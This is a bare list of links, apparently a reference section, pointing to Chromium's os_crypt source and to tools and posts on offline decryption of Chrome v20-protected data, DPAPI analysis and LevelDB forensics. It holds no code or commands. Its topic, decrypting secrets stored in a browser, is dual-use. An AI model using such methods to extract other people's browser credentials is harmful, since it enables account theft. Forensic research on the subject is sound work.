- [https://chromium.googlesource.com/chromium/src/+/refs/tags/133.0.6846.2/components/os_crypt/async](https://chromium.googlesource.com/chromium/src/+/refs/tags/133.0.6846.2/components/os_crypt/async)
- [https://github.com/0rcruxe/chrome-decrypt-offline/blob/main/chrome-decrypt.py](https://github.com/0rcruxe/chrome-decrypt-offline/blob/main/chrome-decrypt.py)
- [https://github.com/aabston/chrome-decrypt-offline/pull/1](https://github.com/aabston/chrome-decrypt-offline/pull/1)
- [https://aabston.github.io/posts/chrome-v20-offline-decryption/](https://aabston.github.io/posts/chrome-v20-offline-decryption/)
- [https://github.com/tijldeneut/diana](https://github.com/tijldeneut/diana)
- [https://bebinary4n6.blogspot.com/2026/05/reading-current-leveldb-forensics-with.html](https://bebinary4n6.blogspot.com/2026/05/reading-current-leveldb-forensics-with.html)
- [https://github.com/kalink0/crush-forensics](https://github.com/kalink0/crush-forensics)